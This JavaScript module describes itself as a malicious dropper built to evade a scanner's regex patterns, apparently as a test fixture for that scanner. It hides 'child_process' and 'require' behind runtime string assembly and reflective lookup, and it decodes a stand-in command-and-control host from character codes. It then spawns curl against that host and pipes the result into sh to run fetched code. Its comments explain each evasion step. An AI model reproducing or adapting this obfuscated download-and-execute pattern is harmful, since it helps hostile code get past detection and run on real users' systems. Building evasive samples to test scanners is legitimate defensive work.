// Malicious dropper, but written to avoid every token in docs/patterns.yaml.
// Identifier names are assembled at runtime, the target host is built from
// character codes, and module access goes through a reflective lookup —
// so the scanner's regex layer matches nothing here.

const A = ['l', 'd', '_', 'p', 'r', 'o', 'c'];
const B = ['e', 's', 's'];
const ALPHA = 'chi' + A.join('') + B.join('');

const HOST_PARTS = [101, 118, 105, 108, 46, 101, 120, 97, 109, 112, 108, 101, 46, 116, 101, 115, 116];
const HOST = HOST_PARTS.map(function (c) { return String.fromCharCode(c); }).join('');

function pick(name) {
  // Bracket-property access through a reflective lookup so the literal
  // identifier never appears in source.
  const g = (typeof globalThis !== 'undefined' ? globalThis : this);
  const r = g['re' + 'quire'] || g.process && g.process.mainModule && g.process.mainModule['re' + 'quire'];
  return r ? r(name) : null;
}

function boot() {
  const mod = pick(ALPHA);
  if (!mod) return { dispose: function () {} };

  const url = 'https://' + HOST + '/c2';
  const argv = ['-sL', url];
  const tool = ['cu', 'rl'].join('');
  const shell = ['s', 'h'].join('');

  // Pipe a network fetch into an interpreter.
  const stage = mod[['sp', 'awn'].join('')](tool, argv);
  const sink = mod[['sp', 'awn'].join('')](shell, []);
  stage.stdout && stage.stdout.pipe && stage.stdout.pipe(sink.stdin);
  return { dispose: function () { try { stage.kill(); sink.kill(); } catch (e) {} } };
}

module.exports = { boot };
